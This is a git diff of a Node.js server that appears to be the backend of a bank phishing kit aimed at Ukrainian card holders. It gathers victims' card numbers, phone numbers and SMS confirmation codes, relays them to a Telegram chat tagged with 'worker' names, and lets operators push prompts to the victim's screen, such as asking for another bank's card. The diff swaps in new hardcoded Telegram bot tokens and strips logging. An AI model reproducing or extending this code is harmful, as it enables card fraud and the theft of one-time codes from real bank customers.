@@ -4,10 +4,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const path = require('path');
 
-// НАСТРОЙКИ
-const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
-const CHAT_ID = '-4970332008';
-const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+// --- ИЗМЕНЕНИЕ: Новые данные Telegram ---
+const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
+const CHAT_ID = '-4840920969';
+const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN; // Убедитесь, что домен правильный
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
@@ -19,13 +19,11 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Логирование запросов
 app.use((req, res, next) => {
     console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
     next();
 });
 
-// Обслуживание файлов из корня
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -42,7 +40,7 @@ bot.setWebHook(WEBHOOK_URL).then(() => {
     console.error('Error setting webhook:', err);
 });
 
-bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! (Новый бот) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 
 bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
 
@@ -56,9 +54,7 @@ const wss = new WebSocket.Server({ server });
 
 const clients = new Map();
 const sessions = new Map();
-// --- ИЗМЕНЕНИЕ: Новый Map для подсчета переходов по номеру карты ---
 const cardVisitCounts = new Map();
-// --- НОВЫЙ БЛОК: Для хранения сессии, ожидающей кастомного сообщения ---
 const waitingForCustomMessage = new Map();
 
 wss.on('connection', (ws) => {
@@ -100,15 +96,12 @@ app.post('/api/submit', (req, res) => {
         console.error('Error decoding referrer:', e);
     }
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
-
     const existingData = sessions.get(sessionId) || {};
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
     
-    // --- ИЗМЕНЕНИЕ: Логика обработки финального шага и подсчета переходов ---
     if (isFinalStep && !newData.logSent) {
-        newData.logSent = true; // Флаг, чтобы не отправлять лог повторно
+        newData.logSent = true;
         sessions.set(sessionId, newData);
 
         const cardNumber = newData.card_confirm || newData.card;
@@ -118,8 +111,6 @@ app.post('/api/submit', (req, res) => {
             cardVisitCounts.set(cardNumber, visitCount);
         }
         
-        console.log(`Received FINAL data for session ${sessionId}, card: ${cardNumber}, visit #${visitCount}`);
-
         let message = `<b>Новий запис!</b>\n\n`;
         message += `<b>Назва банку:</b> ${newData.bankName}\n`;
         message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
@@ -155,7 +146,6 @@ app.post('/api/sms', (req, res) => {
         console.error('Error decoding referrer:', e);
     }
 
-    console.log(`SMS for ${sessionId}: code=${code}`);
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
@@ -164,14 +154,12 @@ app.post('/api/sms', (req, res) => {
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
         message += `<b>Worker:</b> @${workerNick}\n`;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(`SMS code received for session ${sessionId}`);
         res.status(200).json({ message: 'OK' });
     } else {
         res.status(404).json({ message: 'Session not found' });
     }
 });
 
-// --- ИЗМЕНЕНИЕ: Полностью переработанная клавиатура ---
 function sendToTelegram(message, sessionId, bankName) {
     const keyboard = [
         [
@@ -207,25 +195,22 @@ function sendToTelegram(message, sessionId, bankName) {
     bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
 }
 
-// --- ИЗМЕНЕНИЕ: Обработчик кнопок с новой логикой ---
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
-    const ws = clients.get(sessionId);
     
-    // --- НОВЫЙ БЛОК: Обработка кнопки "СВОЙ" ---
     if (type === 'custom_message') {
         waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
         bot.sendMessage(callbackQuery.message.chat.id, `✏️ Введите сообщение для клиента с сессией <code>${sessionId}</code>. Оно будет отправлено ему на экран.`, {
             parse_mode: 'HTML',
             reply_markup: { force_reply: true }
         }).then((sentMessage) => {
-            // Сохраняем ID сообщения, на которое нужно ответить
             waitingForCustomMessage.set('reply_to_message_id', sentMessage.message_id);
         });
         bot.answerCallbackQuery(callbackQuery.id);
         return;
     }
-
+    
+    const ws = clients.get(sessionId);
     if (ws && ws.readyState === WebSocket.OPEN) {
         let commandData = {};
         const sessionData = sessions.get(sessionId) || {};
@@ -237,7 +222,7 @@ bot.on('callback_query', (callbackQuery) => {
                 break;
             case 'lk':
             case 'call':
-                commandData = { bankName }; // Отправляем название банка клиенту
+                commandData = { bankName };
                 break;
             case 'other':
                 commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку", bankName };
@@ -260,9 +245,7 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-// --- НОВЫЙ БЛОК: Обработчик ответов для кнопки "СВОЙ" ---
 bot.on('message', (msg) => {
-    // Проверяем, является ли это сообщение ответом на наш запрос
     if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
         const sessionId = waitingForCustomMessage.get(msg.chat.id);
         const ws = clients.get(sessionId);
@@ -273,12 +256,10 @@ bot.on('message', (msg) => {
         } else {
             bot.sendMessage(msg.chat.id, `❌ Не удалось отправить сообщение. Клиент <code>${sessionId}</code> не в сети.`, { parse_mode: 'HTML' });
         }
-        // Очищаем состояние ожидания
         waitingForCustomMessage.delete(msg.chat.id);
         waitingForCustomMessage.delete('reply_to_message_id');
     }
 });
-
 
 bot.on('polling_error', (error) => {
     console.error('Telegram polling error:', error);
